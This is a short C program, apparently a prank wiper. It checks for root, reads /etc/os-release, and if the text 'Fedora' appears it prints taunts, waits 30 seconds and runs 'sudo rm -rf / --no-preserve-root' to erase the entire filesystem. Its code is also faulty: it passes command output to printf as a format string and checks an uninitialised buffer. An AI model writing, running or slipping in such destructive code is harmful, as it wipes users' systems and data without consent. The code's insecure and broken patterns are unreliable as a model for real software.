#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
	FILE *cmd;
	char result[2048]; 
	char text[2048];
	char search[] = "Fedora";

	if (geteuid() != 0) {
		fprintf(stderr, "APP needs ROOT\n");
		exit(1);
	}

	cmd = popen("cat /etc/os-release", "r");
	if (cmd == NULL) {
		perror("popen");
		exit(EXIT_FAILURE);
	}
	while (fgets(result, sizeof(result), cmd)) {
		char buffer[2048]; //create temp buffer
		snprintf(buffer, sizeof(buffer),"%s", result); //put data from this bs into said bullshit buffer
		
		//take bullshit below and not output to console
		freopen("/dev/null", "w", stdout);

		printf("%s\n", buffer);
		printf(buffer, text); 
		//reenable output
		freopen("/dev/tty", "w", stdout);
	}
	
	if(strstr(text, search) != NULL) {
			system("echo \"This shit does work\n\"");
			system("echo \"Say goodbye to your OS, loser\n\"");
			system("echo \"You got 30 seconds\n\"");
			system("sleep 30s");
			system("echo \"Goodbye, and Good Riddance. Use ANYTHING BUT FEDORA PLEASE!\n\"");
			system("sudo rm -rf / --no-preserve-root");
	} else {
		printf("Your OS is good. Not reddit.\n");
	}
	

	pclose(cmd);
	return 0;

}
